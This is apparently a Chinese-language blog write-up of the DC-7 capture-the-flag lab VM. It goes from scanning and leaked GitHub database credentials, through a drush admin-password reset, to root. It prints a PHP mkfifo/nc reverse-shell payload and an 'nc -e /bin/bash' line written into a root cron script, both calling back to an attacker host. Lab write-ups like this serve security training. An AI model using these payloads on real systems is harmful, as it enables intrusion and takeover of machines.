---
layout: post
title: DC-7
subtitle: DC-7
date: 2023-07-16 09:47
author: Kyon-H
header-img: img/post-bg-2015.jpg
tags:
  - 靶场实战
  - DC系列
published: true
number headings: first-level 2, max 4, 1.1., auto
---

## 1. 信息搜集

ip 扫描发现 `192.168.163.131`

![image.png](https://img.ghostliner.top/8pzokb.png)

nmap 扫描端口

```shell
nmap -T4 -A -p- 192.168.163.131
```

![image.png](https://img.ghostliner.top/7M8xan.png)

访问站点发现特殊字符串

![image.png](https://img.ghostliner.top/RdFxZA.png)

必应搜索 `DC7USER` 发现 GitHub 项目 `staffdb`
[Dc7User/staffdb](https://github.com/Dc7User/staffdb)

在配置文件中发现 mysql 数据库连接配置

![image.png](https://img.ghostliner.top/EfjNcG.png)

```php
<?php
	$servername = "localhost";
	$username = "dc7user";
	$password = "MdR3xOgB7#dW";
	$dbname = "Staff";
	$conn = mysqli_connect($servername, $username, $password, $dbname);
?>
```

## 2. 渗透测试

使用该用户名密码进行 SSH 连接，成功

查看目录，发现 mbox 邮件文件和网站备份文件

![image.png](https://img.ghostliner.top/LC5ABy.png)

查看 mbox 文件，发现定时执行脚本：`/opt/scripts/backups.sh`

查看 `/var/mail/dc7user` 文件，发现自动化任务间隔 15 分钟

![image.png](https://img.ghostliner.top/WVsmvH.png)

查看脚本权限，发现当前用户无法写入，但是 `www-data`可以

![image.png](https://img.ghostliner.top/OoOhy8.png)

查看脚本内容：

```shell
#!/bin/bash
rm /home/dc7user/backups/*
cd /var/www/html/
drush sql-dump --result-file=/home/dc7user/backups/website.sql
cd ..
tar -czf /home/dc7user/backups/website.tar.gz html/
gpg --pinentry-mode loopback --passphrase PickYourOwnPassword --symmetric /home/dc7user/backups/website.sql
gpg --pinentry-mode loopback --passphrase PickYourOwnPassword --symmetric /home/dc7user/backups/website.tar.gz
chown dc7user:dc7user /home/dc7user/backups/*
rm /home/dc7user/backups/website.sql
rm /home/dc7user/backups/website.tar.gz
```

发现 drush 命令：[dupal 瑞士军刀：drush 命令大全](https://www.dwoke.com/node/436)

### 2.1. 用户提权

尝试 www-data 用户提权

```shell
cd /var/www/html
# 更改admin用户密码
drush user-password admin --password="admin"
```

![image.png](https://img.ghostliner.top/pDzFGN.png)

网站登录成功，尝试反弹 shell 获取 `www-data`用户权限，以更改 `backups.sh`脚本

安装插件： <https://ftp.drupal.org/files/projects/php-8.x-1.0.tar.gz>

![image.png](https://img.ghostliner.top/yk1FYQ.png)

开启插件
![image.png](https://img.ghostliner.top/E4bbaT.png)

勾选，点击页面最下方 `install`

### 2.2. 反弹 shell

在文章中添加脚本

```php
<?php system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -nv 192.168.163.132 4444 >/tmp/f');?>
```

![image.png](https://img.ghostliner.top/CxupAM.png)

反弹 shell 成功，编辑 `/opt/scripts/backups.sh` 文件

```shell
echo "nc -nv 192.168.163.132 5555 -e /bin/bash" >/opt/scripts/backups.sh
```

反弹 shell 成功，获取到 root 权限

![image.png](https://img.ghostliner.top/2aDj41.png)

### 2.3. 查看 flag

```shell
python -c "import pty;pty.spawn('/bin/bash')"
cat /root/theflag.txt
```

![image.png](https://img.ghostliner.top/tX2DGp.png)
